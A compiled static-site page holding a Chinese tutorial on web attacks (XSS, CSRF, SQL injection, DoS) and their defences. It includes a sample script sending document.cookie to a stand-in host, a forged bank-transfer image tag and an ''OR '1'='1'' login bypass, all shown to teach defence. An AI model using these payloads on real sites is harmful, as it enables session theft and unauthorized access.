import{_ as i,c as s,o as t,a4 as e}from"./chunks/framework.DdddRsJj.js";const c=JSON.parse('{"title":"一、跨站脚本攻击","description":"","frontmatter":{},"headers":[],"relativePath":"cs/web/attack-tech.md","filePath":"cs/web/attack-tech.md"}'),l={name:"cs/web/attack-tech.md"};function h(n,a,p,r,k,o){return t(),s("div",null,[...a[0]||(a[0]=[e(`<nav class="table-of-contents"><ul><li><a href="#攻击原理">攻击原理</a></li><li><a href="#分类">分类</a></li><li><a href="#危害">危害</a></li><li><a href="#防范手段">防范手段</a><ul><li><a href="#其他方式">其他方式</a></li></ul></li><li><a href="#csp">CSP</a></li><li><a href="#概念">概念</a></li><li><a href="#攻击原理-1">攻击原理</a></li><li><a href="#防范手段-1">防范手段</a><ul><li><a href="#_1-检查-referer-首部字段">1. 检查 Referer 首部字段</a></li><li><a href="#_2-添加校验-token">2. 添加校验 Token</a></li><li><a href="#_3-输入验证码">3. 输入验证码</a></li></ul></li><li><a href="#概念-1">概念</a></li><li><a href="#攻击原理-2">攻击原理</a></li><li><a href="#防范手段-2">防范手段</a><ul><li><a href="#_1-使用参数化查询">1. 使用参数化查询</a></li><li><a href="#_2-单引号转换">2. 单引号转换</a></li></ul></li></ul></nav><h1 id="一、跨站脚本攻击" tabindex="-1">一、跨站脚本攻击 <a class="header-anchor" href="#一、跨站脚本攻击" aria-label="Permalink to &quot;一、跨站脚本攻击&quot;">​</a></h1><p>代码注入攻击。攻击者通过在网站注入恶意脚本，使之在用户的浏览器上运行，从而盗取用户的信息如 cookie等。</p><h2 id="攻击原理" tabindex="-1">攻击原理 <a class="header-anchor" href="#攻击原理" aria-label="Permalink to &quot;攻击原理&quot;">​</a></h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;location.href</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;//domain.com/?c=&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> document.cookie&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p>之后该内容可能会被渲染成以下形式：</p><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;location.href</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;//domain.com/?c=&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> document.cookie&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h2 id="分类" tabindex="-1">分类 <a class="header-anchor" href="#分类" aria-label="Permalink to &quot;分类&quot;">​</a></h2><p>XSS 一般可分为存储型、反射型和 DOM 型。</p><p><strong>存储型</strong>：恶意代码提交到了网站的数据库中，当用户请求数据的时候，服务器将其拼接为 HTML 后返回给了用户，从而导致了恶意代码的执行。</p><p><strong>反射型</strong>：攻击者构建了特殊的 URL，当服务器接收到请求后，从 URL 中获取数据，拼接到 HTML 后返回，从而导致了恶意代码的执行。</p><p><strong>DOM 型</strong>：攻击者构建了特殊的 URL，用户打开网站后，js 脚本从 URL 中获取数据，从而导致了恶意代码的执行。</p><blockquote><p>这个是前端脚本的不可靠而造成的。</p></blockquote><h2 id="危害" tabindex="-1">危害 <a class="header-anchor" href="#危害" aria-label="Permalink to &quot;危害&quot;">​</a></h2><ul><li>窃取用户的 Cookie</li><li>伪造虚假的输入表单骗取个人信息</li><li>显示伪造的文章或者图片</li></ul><h2 id="防范手段" tabindex="-1">防范手段 <a class="header-anchor" href="#防范手段" aria-label="Permalink to &quot;防范手段&quot;">​</a></h2><p>XSS 攻击的预防可以从两个方面入手：</p><ul><li><p>阻止恶意代码提交：这只能针对那些明确的输入类型，例如数字、URL。</p></li><li><p>阻止浏览器执行恶意代码：这个可以从以下几种方法入手：</p><ul><li>前后端分离方式，设置的内容被明确指定类型。</li><li>对插入到 HTML 中的代码做好充分的转义。</li><li>对于 DOM 型的攻击，应该多留意数据获取渲染和字符串拼接的时候。</li></ul></li></ul><h3 id="其他方式" tabindex="-1">其他方式 <a class="header-anchor" href="#其他方式" aria-label="Permalink to &quot;其他方式&quot;">​</a></h3><p><strong>CSP</strong>：内容安全策略，建立一个白名单，告诉浏览器哪些外部资源可以加载和执行。</p><p><strong>Cookie</strong>：设置 HttpOnly 可以防止JS脚本访问。</p><p><strong>验证码</strong>：防止脚本冒充用户提交危险操作。</p><h2 id="csp" tabindex="-1">CSP <a class="header-anchor" href="#csp" aria-label="Permalink to &quot;CSP&quot;">​</a></h2><p>建立一个白名单，让浏览器阻止异常资源的加载。通常有两种方式来开启 CSP：</p><ul><li>设置 HTTP 首部中的 Content-Security-Policy。</li><li>一种是设置 meta 标签的方式。</li></ul><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">meta</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> http-equiv</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;Content-Security-Policy&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><blockquote><p><a href="http://jsxss.com/zh/try.html" target="_blank" rel="noreferrer">XSS 过滤在线测试</a></p></blockquote><h1 id="二、跨站请求伪造" tabindex="-1">二、跨站请求伪造 <a class="header-anchor" href="#二、跨站请求伪造" aria-label="Permalink to &quot;二、跨站请求伪造&quot;">​</a></h1><h2 id="概念" tabindex="-1">概念 <a class="header-anchor" href="#概念" aria-label="Permalink to &quot;概念&quot;">​</a></h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p><h2 id="攻击原理-1" tabindex="-1">攻击原理 <a class="header-anchor" href="#攻击原理-1" aria-label="Permalink to &quot;攻击原理&quot;">​</a></h2><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</span></span></code></pre></div><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;</span></span></code></pre></div><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p><h2 id="防范手段-1" tabindex="-1">防范手段 <a class="header-anchor" href="#防范手段-1" aria-label="Permalink to &quot;防范手段&quot;">​</a></h2><h3 id="_1-检查-referer-首部字段" tabindex="-1">1. 检查 Referer 首部字段 <a class="header-anchor" href="#_1-检查-referer-首部字段" aria-label="Permalink to &quot;1. 检查 Referer 首部字段&quot;">​</a></h3><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><h3 id="_2-添加校验-token" tabindex="-1">2. 添加校验 Token <a class="header-anchor" href="#_2-添加校验-token" aria-label="Permalink to &quot;2. 添加校验 Token&quot;">​</a></h3><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p><h3 id="_3-输入验证码" tabindex="-1">3. 输入验证码 <a class="header-anchor" href="#_3-输入验证码" aria-label="Permalink to &quot;3. 输入验证码&quot;">​</a></h3><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p><h1 id="三、sql-注入攻击" tabindex="-1">三、SQL 注入攻击 <a class="header-anchor" href="#三、sql-注入攻击" aria-label="Permalink to &quot;三、SQL 注入攻击&quot;">​</a></h1><h2 id="概念-1" tabindex="-1">概念 <a class="header-anchor" href="#概念-1" aria-label="Permalink to &quot;概念&quot;">​</a></h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p><h2 id="攻击原理-2" tabindex="-1">攻击原理 <a class="header-anchor" href="#攻击原理-2" aria-label="Permalink to &quot;攻击原理&quot;">​</a></h2><p>例如一个网站登录验证的 SQL 查询代码为：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">strSQL </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;SELECT * FROM users WHERE (name = &#39;&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> userName </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;&#39;) and (pw = &#39;&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">+</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> passWord</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;&#39;);&quot;</span></span></code></pre></div><p>如果填入以下内容：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">userName </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;1&#39; OR &#39;1&#39;=&#39;1&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">passWord</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;1&#39; OR &#39;1&#39;=&#39;1&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span></code></pre></div><p>那么 SQL 查询字符串为：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">strSQL </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;SELECT * FROM users WHERE (name = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;) and (pw = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;);&quot;</span></span></code></pre></div><p>此时无需验证通过就能执行以下查询：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">strSQL </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;SELECT * FROM users;&quot;</span></span></code></pre></div><h2 id="防范手段-2" tabindex="-1">防范手段 <a class="header-anchor" href="#防范手段-2" aria-label="Permalink to &quot;防范手段&quot;">​</a></h2><h3 id="_1-使用参数化查询" tabindex="-1">1. 使用参数化查询 <a class="header-anchor" href="#_1-使用参数化查询" aria-label="Permalink to &quot;1. 使用参数化查询&quot;">​</a></h3><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">PreparedStatement stmt </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> connection.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">prepareStatement</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">stmt.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">setString</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, userid);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">stmt.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">setString</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, password);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ResultSet rs </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> stmt.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">executeQuery</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span></code></pre></div><h3 id="_2-单引号转换" tabindex="-1">2. 单引号转换 <a class="header-anchor" href="#_2-单引号转换" aria-label="Permalink to &quot;2. 单引号转换&quot;">​</a></h3><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p><h1 id="四、拒绝服务攻击" tabindex="-1">四、拒绝服务攻击 <a class="header-anchor" href="#四、拒绝服务攻击" aria-label="Permalink to &quot;四、拒绝服务攻击&quot;">​</a></h1><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p><h1 id="参考资料" tabindex="-1">参考资料 <a class="header-anchor" href="#参考资料" aria-label="Permalink to &quot;参考资料&quot;">​</a></h1><ul><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noreferrer">维基百科：跨站脚本</a></li><li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noreferrer">维基百科：SQL 注入攻击</a></li><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noreferrer">维基百科：跨站点请求伪造</a></li><li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noreferrer">维基百科：拒绝服务攻击</a></li></ul>`,72)])])}const E=i(l,[["render",h]]);export{c as __pageData,E as default};
